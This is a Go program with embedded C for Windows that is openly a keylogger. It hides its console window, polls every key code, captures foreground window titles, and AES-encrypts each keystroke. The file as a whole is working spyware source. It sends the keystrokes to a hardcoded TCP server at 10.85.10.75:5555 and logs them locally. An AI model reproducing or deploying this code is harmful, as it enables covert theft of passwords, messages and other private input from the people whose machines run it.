package main

// #define WIN32_LEAN_AND_MEAN
// #define NOCRYPT
// #define NOGDI
// #define NOSERVICE
// #define NOMCX
// #define NOIME
// #include <windows.h>
// #include <stdio.h>
/*
char title[1024];
char * getWindowR()
{
	HWND hwndHandle = GetForegroundWindow();
	memset(title,0,1024);
	GetWindowText(hwndHandle, title, 1024);
	//printf("From c: %s\n",title);
	return title;
}
void HideWindow()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
}*/
import "C"


import (
	"fmt"
	"time"
	"strconv"
	"unsafe"
	"os"
	"bytes"
	"net"
	"log"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io"
)


func SendMessageToServer(message string) {

    CIPHER_KEY := []byte("(danas je danas)")

	conn, err := net.Dial("tcp", "10.85.10.75:5555")
	//conn, err := net.Dial("tcp", "127.0.0.1:5555")
	
	defer conn.Close()

	if err != nil {
		log.Fatalln(err)
	}


	encrypted, err := encrypt(CIPHER_KEY, message);

	if err != nil {
		log.Println(err)
	}

	conn.Write([]byte(encrypted))
	
	AppendStringToFile("output.txt", string(encrypted)+"\n")

	buff := make([]byte, 1024)
	conn.Read(buff)
}


func AppendStringToFile(path string, text string) error {

		t := time.Now()

		f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE, os.ModeAppend)
		if err != nil {
				return err
		}
		defer f.Close()

		_, err = f.WriteString(t.Format("2006-01-02 15:04:05") + " " + text)
		if err != nil {
				return err
		}
		return nil
}


func encrypt(key []byte, message string) (encmess string, err error) {
		plainText := []byte(message)

		block, err := aes.NewCipher(key)
		if err != nil {
			return
		}

		//IV needs to be unique, but doesn't have to be secure.
		//It's common to put it at the beginning of the ciphertext.
		cipherText := make([]byte, aes.BlockSize+len(plainText))
		iv := cipherText[:aes.BlockSize]
		if _, err = io.ReadFull(rand.Reader, iv); err != nil {
			return
		}

		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)

		//returns to base64 encoded string
		encmess = base64.URLEncoding.EncodeToString(cipherText)
	return
}



func main() {

	fmt.Println("Keylogger is active, now")
	
	var c  C.int
	var rv C.SHORT
	lastWindowText :=""

	C.HideWindow();
	
	for {
	
		time.Sleep(25*1000*1000) //25ms

		var arr [1024]byte
		copy(arr[:], C.GoBytes(unsafe.Pointer(C.getWindowR()), 1024))
		s := string(bytes.Trim(arr[:], "\x00"));

		if(s!=lastWindowText) {

			fmt.Println("\n" + s)
			lastWindowText=s
			SendMessageToServer("[WINDOW]" + s + "\n")
		}





		for c = 0; c < 255; c++ {
			rv = C.GetAsyncKeyState(c)
			out :=""
			if((rv & 1)!=0){ // On Press Button Down
					
				if c == 1 {
					out="[LMOUSE]"
				} else if c == 2 {
					out="[RMOUSE]"
				} else if(c == 4) {
		    		out = "[MMOUSE]" // Mouse Middle
		    	} else if(c == 13) {
		    		out = "[ENTER]\n"
		    	} else if(c == 16 || c == 17 || c == 18) {
		    		out = ""
		    	} else if (c == C.VK_SHIFT || c == C.VK_LSHIFT || c == C.VK_RSHIFT) {
		    		out = "[SHIFT]"
		    	} else if(c == 162 || c == 163) { // lastc == 17
		    		out = "[CTRL]"
		    	} else if(c == 164) { // lastc == 18
		    		out = "[ALT]"
		    	} else if(c == 165) {
		    		out = "[ALT GR]"
		    	} else if(c == 8) {
		    		out = "[BACKSPACE]"
		    	} else if(c == 9) {
		    		out = "[TAB]"
				} else if(c == 16) {
		    		out = "[SHIFT]"
		    	} else if(c == 27) {
		    		out = "[ESC]"
	    		} else if(c == 33) {
		    		out = "[PAGE UP]"
		    	} else if(c == 34) {
		    		out = "[PAGE DOWN]"
		    	} else if(c == 35) {
		    		out = "[HOME]"
		    	} else if(c == 36) {
		    		out = "[POS1]"
		    	} else if(c == 37) {
		    		out = "[ARROW LEFT]"
		    	} else if(c == 38) {
		    		out = "[ARROW UP]"
		    	} else if(c == 39) {
		    		out = "[ARROW RIGHT]"
		    	} else if(c == 40) {
		    		out = "[ARROW DOWN]"
		    	} else if(c == 45) {
		    		out = "[INS]"
		    	} else if(c == 46) {
		    		out = "[DEL]"
				} else if(c == 219) {
		    		out = "[S*]"
				} else if(c == 221) {
		    		out = "[D*]"
				} else if(c == 220) { 
		    		out = "[Z*]"
				} else if(c == 32) { 
		    		out = "[SPACE]"
		    	} else if(c == 91 || c == 92) {
		    		out = "[WIN]"
		    	} else if(c >= 96 && c <= 105) {
		    		out = strconv.Itoa(int(c) - 96)
		    	} else if(c == 106) {
		    		out = "/"
		    	} else if(c == 107) {
		    		out = "+"
		    	} else if(c == 109) {
		    		out = "-"
		    	} else if(c == 109) {
		    		out = ","
		    	} else if(c >= 112 && c <= 123) {
		    		out = "[F" + strconv.Itoa(int(c) - 111) + "]"
		    	} else if(c == 144) {
		    		out = "[NUM]"
		    	} else if(c == 192) {
		    		out = "[OE]"
		    	} else if(c == 222) {
		    		out = "[C**]"
		    	} else if(c == 186) {
		    		out = "[C*]"
		    	} else if(c == 186) {
		    		out = "+"
		    	} else if(c == 188) {
		    		out = ","
		    	} else if(c == 189) {
		    		out = "-"
		    	} else if(c == 190) {
		    		out = "."
		    	} else if(c == 191) {
		    		out = "#"
		    	} else if(c == 226) {
		    		out = "<"
		    	} else {
						
					if (c >= 96 && c <= 105) {
						c -= 48
					} else if (c >= 65 && c <= 90) { // A-Z
							
						var lowercase = ((C.GetKeyState(C.VK_CAPITAL) & 0x0001) != 0)

							
						if ((C.GetKeyState(C.VK_SHIFT) & 0x0001) != 0 || (C.GetKeyState(C.VK_LSHIFT) & 0x0001) != 0 || (C.GetKeyState(C.VK_RSHIFT) & 0x0001) != 0) {
							lowercase = !lowercase
						}

						if (lowercase) { 
							c += 32
						}
					}
					out = string(int(c))
				}
				SendMessageToServer(out)
				fmt.Print(out)
			}
		}
	}


	

	

	select {}
}
